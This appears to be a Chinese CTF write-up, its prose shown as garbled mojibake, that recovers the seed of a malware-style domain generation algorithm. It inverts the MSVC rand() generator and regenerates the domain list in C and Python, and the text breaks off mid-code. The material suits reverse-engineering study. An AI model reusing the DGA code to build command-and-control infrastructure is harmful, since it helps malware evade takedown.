å¾ˆç®€å•ï¼ŒæŒ‡å®šéšæœºæ•°ç§å­å–ä½™æ¥ç”Ÿæˆå­—ç¬¦ä¸²ã€‚32bitçš„ç§å­ï¼Œä½†æ˜¯ç»™çš„100ä¸ªåŸŸåæ˜¯éšæœºé‡‡æ ·çš„100ä¸ªåŸŸåï¼Œæ‰“ä¹±äº†é¡ºåºï¼Œæ²¡æ³•ç›´æ¥çˆ†ç ´ã€‚</p><p>åº”è¯¥æ˜¯è¦çœ‹randçš„æºç ï¼Œå‚è€ƒ<a href="https://crypto.stackexchange.com/questions/6760/how-does-the-rand-function-in-c-work">https://crypto.stackexchange.com/questions/6760/how-does-the-rand-function-in-c-work</a></p><p>å…³é”®æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> holdrand = <span class="number">1L</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (((holdrand = holdrand * <span class="number">214013L</span> + <span class="number">2531011L</span>) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x7fff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">srand</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> seed)</span> </span>&#123;</span><br><span class="line">   holdrand = (<span class="keyword">long</span>) seed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶å®ç”Ÿæˆéšæœºæ•°ç®—æ³•å¾ˆç®€å•ï¼Œå°±ä¸€è¡Œã€‚è€Œä¸”æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°ä»…å–å†³äºholdrandï¼Œç”Ÿæˆä¸€ä¸ªéšæœºæ•°çš„åŒæ—¶æŒ‡å®šä¸‹ä¸€æ¬¡ç”Ÿæˆéšæœºæ•°çš„holdrandï¼Œå°±æ˜¯ä¸€ä¸ªé€’æ¨å…¬å¼ã€‚</p><p>è¿™ä¸ªé¢˜ç›®ç›¸å½“äºç»™äº†æˆ‘ä»¬100ä¸ªè¿ç»­çš„éšæœºæ•°ç‰‡æ®µï¼ˆæ¨¡35çš„ç»“æœï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“æ¯ä¸ªç‰‡æ®µçš„indexã€‚</p><p>åŒæ—¶ç¨‹åºåœ¨è¾“å‡ºdgaåŸŸåæ—¶ï¼Œè¾“å‡ºç¬¬ä¸€ä¸ªdgaåŸŸååªéœ€è¦ç”Ÿæˆä¸€ä¸ªdgaï¼›è¾“å‡ºç¬¬äºŒä¸ªdgaåŸŸåæ—¶è¦ç”Ÿæˆä¸¤ä¸ªdgaï¼ŒæŠŠæœ€åä¸€ä¸ªè¾“å‡ºï¼›è¾“å‡ºç¬¬ä¸‰ä¸ªdgaåŸŸåæ—¶è¦ç”Ÿæˆä¸‰ä¸ªdgaï¼ŒæŠŠæœ€åçš„è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºå…±ç”Ÿæˆäº†1+2+3+â€¦+1000ï¼Œå³500500 ä¸ªåŸŸåã€‚</p><p>å…¶å®å®šä¹‰ç§å­å°±æ˜¯å®šä¹‰ä¸€ä¸ªholdrandï¼Œæˆ‘ä»¬ä»»æ„é€‰ä¸€ä¸ªè¾“å‡ºåŸŸåï¼Œç›´æ¥çˆ†ç ´ç§å­ï¼Œå¯ä»¥å¾—åˆ°ç”Ÿæˆè¿™ä¸ªåŸŸåå‰çš„holdrandã€‚</p><p>å°±æ‹¿ç¬¬ä¸€ä¸ªåŸŸåä¸ºä¾‹ï¼Œç›´æ¥çˆ†ç ´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> res[<span class="number">24</span>];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> v11[<span class="number">35</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> correct[<span class="number">19</span>]=<span class="string">&quot;13mrjyvjjp4azbbkt7&quot;</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed;</span><br><span class="line"><span class="keyword">for</span>(seed=<span class="number">0</span>;seed&lt;(<span class="number">1</span>&lt;&lt;<span class="number">32</span><span class="number">-1</span>);seed++)&#123;</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">18</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!(v11[rand()%<span class="number">34</span>]==correct[i]))&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,seed);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°682174533ï¼Œä¹Ÿå°±æ˜¯è¯´ç”Ÿæˆ13mrjyvjjp4azbbkt7ä¹‹å‰ï¼Œholdrandçš„å€¼æ˜¯682174533ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç¡®å®šï¼Œè¿™ä¸ªåŸŸåæ˜¯ç¬¬å‡ ä¸ªè¾“å‡ºçš„ã€‚æˆ‘ä»¬å¯ä»¥ä»¥682174533ä¸ºç§å­ä¸€ç›´ç”ŸæˆåŸŸåï¼ŒæŠŠæ¯ä¸ªåŸŸåä¸é¢˜ç›®ä¸­çš„100ä¸ªåŸŸåå¯¹æ¯”ï¼Œç›¸ç­‰å°±è®°å½•ä¸‹æ¥æ˜¯ç¬¬å‡ ä¸ªç”Ÿæˆçš„ï¼Œä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> *ext[]= &#123;<span class="string">&quot;.ru&quot;</span>,<span class="string">&quot;.com&quot;</span>,<span class="string">&quot;.net&quot;</span>,<span class="string">&quot;.biz&quot;</span>,<span class="string">&quot;.cn&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v11[<span class="number">35</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> correct[<span class="number">101</span>][<span class="number">24</span>] = &#123;<span class="string">&quot;13mrjyvjjp4azbbkt7.com&quot;</span>,<span class="string">&quot;1i8vw27dwm8ndevior.biz&quot;</span>,<span class="string">&quot;1j24mwoqqyfcx1qqss.ru&quot;</span>,<span class="string">&quot;1salpm53tfy88aqd5n.com&quot;</span>,<span class="string">&quot;2iffaefkjqo8bjtcu8.net&quot;</span>,<span class="string">&quot;2my1q1eee7i6ogxrgq.ru&quot;</span>,<span class="string">&quot;34wg8meomx1na5m2wc.net&quot;</span>,<span class="string">&quot;38yijueupbbm5k5czj.ru&quot;</span>,<span class="string">&quot;3wcly5scymjapoj7qa.com&quot;</span>,<span class="string">&quot;4bgi4o12snvq6ox3dx.cn&quot;</span>,<span class="string">&quot;4girwa5l6z8zl5ehbh.net&quot;</span>,<span class="string">&quot;52nh81fuoma1qppv8f.ru&quot;</span>,<span class="string">&quot;54u6nwwry22lay7x1r.cn&quot;</span>,<span class="string">&quot;5d8bf1p66ysy5bqfwj.cn&quot;</span>,<span class="string">&quot;5ewy3vxhb3vl5ydjhl.biz&quot;</span>,<span class="string">&quot;63sww2skr1kynlp56s.net&quot;</span>,<span class="string">&quot;6danvuyai8sykkg15r.biz&quot;</span>,<span class="string">&quot;6fqlt8ygeov2xb73vn.cn&quot;</span>,<span class="string">&quot;78zk88cs6viwj31qhh.com&quot;</span>,<span class="string">&quot;7lglt6bjbnxmnjvea8.biz&quot;</span>,<span class="string">&quot;7sryvpk8j76mmyfzqv.biz&quot;</span>,<span class="string">&quot;7xlwbrwad4khucxjo1.cn&quot;</span>,<span class="string">&quot;86ajx1ehnoxtoas81w.com&quot;</span>,<span class="string">&quot;8hmadc4ktcbp434i7v.com&quot;</span>,<span class="string">&quot;a6mj5awo1llzf6vptc.com&quot;</span>,<span class="string">&quot;aey5xbjb1yytrpo1qc.cn&quot;</span>,<span class="string">&quot;b7rv1i7lguqh4571ic.cn&quot;</span>,<span class="string">&quot;bmqqhw57ih541j2ker.biz&quot;</span>,<span class="string">&quot;cnfy6toctwqfckkcm2.ru&quot;</span>,<span class="string">&quot;cqjenuvx2vg7eit63h.cn&quot;</span>,<span class="string">&quot;cvbs1koh7mst2ds3ld.com&quot;</span>,<span class="string">&quot;cwcnn4b4wge5xilv7n.com&quot;</span>,<span class="string">&quot;diynmgrfvjlblouob1.biz&quot;</span>,<span class="string">&quot;djzmdjg3omx8p4ns3e.biz&quot;</span>,<span class="string">&quot;dk8ttigditrpxafg8i.biz&quot;</span>,<span class="string">&quot;dxhun2re2x1jywmwqo.biz&quot;</span>,<span class="string">&quot;eizwxdiapuco67vpa5.ru&quot;</span>,<span class="string">&quot;ep1gcq3mont3wtaygc.cn&quot;</span>,<span class="string">&quot;eqvp786z5t2iingl3x.com&quot;</span>,<span class="string">&quot;fltekcvgk42fitmjws.net&quot;</span>,<span class="string">&quot;fqqghkn46vjkzpru8b.cn&quot;</span>,<span class="string">&quot;gblgpuvnvdh2t7lz6f.biz&quot;</span>,<span class="string">&quot;giwn2ajock6qoo8jqh.com&quot;</span>,<span class="string">&quot;gsrt5g6dc44y1krilm.com&quot;</span>,<span class="string">&quot;gwwflrqe8tzdnkzbad.net&quot;</span>,<span class="string">&quot;gxmmxc1yxlcky4b48i.ru&quot;</span>,<span class="string">&quot;h5oj6uvuhhc1fayebb.net&quot;</span>,<span class="string">&quot;hcp2gvoxls1nfcr8ve.cn&quot;</span>,<span class="string">&quot;hee15fplmi7lewt1mh.net&quot;</span>,<span class="string">&quot;hejxlnvf1f8qeuzvrl.com&quot;</span>,<span class="string">&quot;hoovp7rac48dhvpmpz.net&quot;</span>,<span class="string">&quot;i8qq4ws38cyucerw4a.net&quot;</span>,<span class="string">&quot;ip6uqhdcpffrcihueb.biz&quot;</span>,<span class="string">&quot;it2qi12jtir5ezbngj.net&quot;</span>,<span class="string">&quot;jg84zupddsz2474o31.cn&quot;</span>,<span class="string">&quot;jhhha1dkrcxbpq1gef.net&quot;</span>,<span class="string">&quot;jp562btwn6b6lqh2v4.net&quot;</span>,<span class="string">&quot;jr6nwh7kpi5yvamuth.ru&quot;</span>,<span class="string">&quot;juq233tm5x226256yt.biz&quot;</span>,<span class="string">&quot;kcfyhc1qpuehugdhfh.cn&quot;</span>,<span class="string">&quot;krawjmve7je3leppj6.com&quot;</span>,<span class="string">&quot;ksz45gy7lg64m1yegu.biz&quot;</span>,<span class="string">&quot;kym26cus7oy47ejdns.biz&quot;</span>,<span class="string">&quot;l8pvucuo31tafkray5.net&quot;</span>,<span class="string">&quot;maree2g5ofzkpawm3p.com&quot;</span>,<span class="string">&quot;mcbp8rmlocn8lx82tk.ru&quot;</span>,<span class="string">&quot;n57guekus5jogctr3e.biz&quot;</span>,<span class="string">&quot;n8zlxmjoj4ygms8de7.biz&quot;</span>,<span class="string">&quot;nbrbhh2tcj2lg6bmz2.net&quot;</span>,<span class="string">&quot;nlbyrkzjx2mxrs36ox.ru&quot;</span>,<span class="string">&quot;npeqblt5rstjedji14.com&quot;</span>,<span class="string">&quot;nyc5q1wpfk8wz2wwcr.net&quot;</span>,<span class="string">&quot;opfqo1et1t2uafmian.com&quot;</span>,<span class="string">&quot;ox6ytaor1zaw3q4ayh.cn&quot;</span>,<span class="string">&quot;p3otg2s5rroc6q66lo.biz&quot;</span>,<span class="string">&quot;pi5kv5smcp2c6apyws.cn&quot;</span>,<span class="string">&quot;piw3lg3rg6l7hkil5c.cn&quot;</span>,<span class="string">&quot;pw2rtqouw8jv3ygrjz.cn&quot;</span>,<span class="string">&quot;qasmd3q8fextt8d8pe.com&quot;</span>,<span class="string">&quot;qn3spnkqzq7zbk78u2.biz&quot;</span>,<span class="string">&quot;qs4rbmn88sszioir2p.cn&quot;</span>,<span class="string">&quot;qxv77gv8yiju5u6lr5.biz&quot;</span>,<span class="string">&quot;rn4lgriv68zkediyl8.biz&quot;</span>,<span class="string">&quot;seym7xlklokoetaznu.biz&quot;</span>,<span class="string">&quot;sfidso8x1el2zafisb.com&quot;</span>,<span class="string">&quot;suoj6qdfb6phfu27d5.com&quot;</span>,<span class="string">&quot;tf552bfsqgm2mvftz7.cn&quot;</span>,<span class="string">&quot;tf6ccv76jkdza7qbxj.com&quot;</span>,<span class="string">&quot;tojrtinlfkhwy777q4.biz&quot;</span>,<span class="string">&quot;tr44klrfrnaj5pwr8u.com&quot;</span>,<span class="string">&quot;tu7yg7dr41juxibyv1.ru&quot;</span>,<span class="string">&quot;tyn1pdkagg4pq8zjwy.cn&quot;</span>,<span class="string">&quot;uatztm3o4cn58p8ez6.ru&quot;</span>,<span class="string">&quot;uga11fbdkk6p3eehst.biz&quot;</span>,<span class="string">&quot;vcdtmzs5ug6njdjosa.ru&quot;</span>,<span class="string">&quot;vpn8qcwrsnzb88juv2.net&quot;</span>,<span class="string">&quot;vsd4t2zh81fux8hje5.com&quot;</span>,<span class="string">&quot;vu86xk61km7tir5yx4.biz&quot;</span>,<span class="string">&quot;ykmg2j4deklnyg3dsq.net&quot;</span>,<span class="string">&quot;zv88bhuwftedaspl56.ru&quot;</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">brute_force</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> seed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> amount=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> res[<span class="number">24</span>];</span><br><span class="line"><span class="keyword">int</span> v1 = <span class="number">1</span>;</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">int</span> v2,v3,v5,len,v7;</span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">res[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">v7 = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">len=<span class="built_in">strlen</span>(res);</span><br><span class="line">res[len]=v11[rand()%<span class="number">34</span>];</span><br><span class="line">res[len+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">v3 = v7-- == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!v3);</span><br><span class="line">v5 = rand();</span><br><span class="line"><span class="built_in">strcat</span>(res,ext[v5%<span class="number">5</span>]);</span><br><span class="line">amount++;</span><br><span class="line"><span class="keyword">int</span> tmp;</span><br><span class="line"><span class="keyword">for</span>(tmp=<span class="number">0</span>;tmp&lt;<span class="number">100</span>;tmp++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(res,correct[tmp])==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,amount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">++v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v1!=v2);</span><br><span class="line">++v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v1!=<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> res[<span class="number">24</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed=<span class="number">682174533</span>;</span><br><span class="line">brute_force(seed);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,725,1450,2176,5821,6553,34340,35110,35881,38975,39751,67541,68353,69166,102506,</span><br></pre></td></tr></table></figure><p>è¿™äº›å¯¹åº”çš„åŸŸåéƒ½æ˜¯åœ¨è¾“å‡º13mrjyvjjp4azbbkt7ä¹‹åè¾“å‡ºçš„ï¼Œè¾“å‡ºçš„æ•°å­—å°±æ˜¯åç§»åŸŸåæ•°é‡ã€‚</p><p>ç„¶åæˆ‘ä»¬æŠŠ500500ä¸ªåŸŸåä¸­è¾“å‡ºåŸŸåçš„indexåˆ—å‡ºæ¥ï¼Œéå†æ‰€æœ‰indexï¼Œå¦‚æœå¯¹äºä¸Šé¢çš„æ¯ä¸ªåç§»ï¼ŒindexåŠ ä¸Šåç§»çš„ç»“æœä¾ç„¶åœ¨indexçš„listä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ‰¾åˆ°13mrjyvjjp4azbbkt7çš„indexï¼ˆå³13mrjyvjjp4azbbkt7æ˜¯ç¨‹åºç”Ÿæˆçš„ç¬¬å‡ ä¸ªåŸŸåï¼‰ã€‚</p><p>Pythonè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">index_list = []</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1001</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    index_list.append(num)</span><br><span class="line">b = [<span class="number">1</span>, <span class="number">725</span>, <span class="number">1450</span>, <span class="number">2176</span>, <span class="number">5821</span>, <span class="number">6553</span>, <span class="number">34340</span>, <span class="number">35110</span>, <span class="number">35881</span>, <span class="number">38975</span>, <span class="number">39751</span>, <span class="number">67541</span>, <span class="number">68353</span>, <span class="number">69166</span>, <span class="number">102506</span>]</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> index_list:</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        <span class="keyword">if</span> (a + i - <span class="number">1</span>) <span class="keyword">not</span> <span class="keyword">in</span> index_list:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        index = a</span><br><span class="line">        print(a)</span><br></pre></td></tr></table></figure><p>è¾“å‡º261726ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªåŸŸåæ˜¯ç¨‹åºéšæœºç”Ÿæˆçš„ç¬¬261726ä¸ªåŸŸåã€‚</p><p>ç°åœ¨æˆ‘ä»¬éœ€è¦é€šè¿‡ç°åœ¨çš„çŠ¶æ€ï¼Œè¿˜åŸåˆå§‹ç§å­ã€‚é€’æ¨å…¬å¼æ˜¯<code>holdrand = holdrand * 214013L + 2531011L</code>ï¼Œè¿™é‡Œlongç±»å‹ä¼šäº§ç”Ÿæº¢å‡ºï¼Œå¯èƒ½å‡ºç°è´Ÿæ•°ï¼Œå¯¼è‡´æ— æ³•ç›´æ¥é€†æ¨å›å»ã€‚</p><p>æŸ¥é˜…cè¯­è¨€å­˜å‚¨longç±»å‹çš„ç›¸å…³çŸ¥è¯†ï¼ŒåŸç†æ˜¯ä¸€ä¸ªlongç±»å‹ç”¨32bitå­˜å‚¨ï¼Œæœ€é«˜ä½ä½œä¸ºæ­£è´Ÿæ ‡å¿—ä½ï¼Œå…¶ä½™31bitè®°å½•å€¼ï¼Œå¦‚æœè®¡ç®—ç»“æœè¶…å‡º32bitï¼Œé‚£å°±åªå–ä½32bitã€‚</p><p>è¿™é‡Œæƒ³äº†å¾ˆä¹…å¦‚ä½•é€†æ¨è§£æ–¹ç¨‹ï¼Œæœ€åå‘ç°å…¶å®ä¸ç”¨ç®¡ä»€ä¹ˆæ­£è´Ÿï¼Œå› ä¸ºç”Ÿæˆçš„éšæœºæ•°æ˜¯holdrand 32ä½ä¸­çš„é«˜16ä½ï¼Œæ— è®ºæ€ä¹ˆæº¢å‡ºï¼Œåªè¦å…³å¿ƒholdrandä½32ä½å°±å¥½äº†ï¼Œå³ä½¿æ­£è´Ÿæ ‡å¿—ä½æ˜¯1ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å½“æˆæ­£å¸¸çš„32bitæ­£æ•°æ¥è®¡ç®—ã€‚è¿™æ ·å¯ä»¥æŠŠé—®é¢˜è½¬æˆè§£åŒä½™æ–¹ç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a*x+b&#x3D;c mod n</span><br></pre></td></tr></table></figure><p>næ˜¯2^32ï¼Œaæ˜¯214013Lï¼Œbæ˜¯2531011Lï¼Œè§£æ–¹ç¨‹ç›´æ¥å‡bå†ä¹˜é€†å…ƒå°±å¥½äº†ã€‚</p><p>è¿™ä¸ªåŸŸåæ˜¯ç¬¬261726ä¸ªç”Ÿæˆçš„åŸŸåï¼Œæˆ‘ä»¬åªéœ€è¦é€†æ¨ (261726-1)*19æ¬¡çŠ¶æ€ï¼Œå°±å¯ä»¥è¿˜åŸåˆ°æœ€åˆçš„seedã€‚</p><p>Pythonè„šæœ¬ï¼š    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">index = <span class="number">261726</span></span><br><span class="line">seed = <span class="number">682174533</span></span><br><span class="line">a_inv = invert(<span class="number">214013</span>, <span class="number">2</span> ** <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv</span>():</span></span><br><span class="line">    <span class="keyword">global</span> seed</span><br><span class="line">    seed = ((seed - <span class="number">2531011</span>) * a_inv) % (<span class="number">2</span> ** <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index<span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">        inv()</span><br><span class="line"><span class="built_in">print</span> seed</span><br></pre></td></tr></table></figure><p>å¾—åˆ°åˆå§‹seedæ˜¯77980108ï¼Œç„¶åç”ŸæˆdgaåŸŸåå°±å¥½äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed = <span class="number">77980108</span>;</span><br><span class="line"><span class="keyword">char</span> res[<span class="number">24</span>];</span><br><span class="line"><span class="keyword">char</span> v11[<span class="number">36</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *ext[]= &#123;<span class="string">&quot;.ru&quot;</span>,<span class="string">&quot;.com&quot;</span>,<span class="string">&quot;.net&quot;</span>,<span class="string">&quot;.biz&quot;</span>,<span class="string">&quot;.cn&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> v1 = <span class="number">1</span>;</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">int</span> v2,v3,v5,len,v7;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">res[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">v7 = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">len=<span class="built_in">strlen</span>(res);</span><br><span class="line">res[len]=v11[rand()%<span class="number">34</span>];</span><br><span class="line">res[len+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">v3 = v7-- == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!v3);</span><br><span class="line">v5 = rand();</span><br><span class="line"><span class="keyword">if</span>(v2==(v1<span class="number">-1</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%s\n&quot;</span>,res,ext[v5%<span class="number">5</span>]);</span><br><span class="line">&#125;</span><br><span class="line">++v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v1!=v2);</span><br><span class="line">++v1;</span><br><span 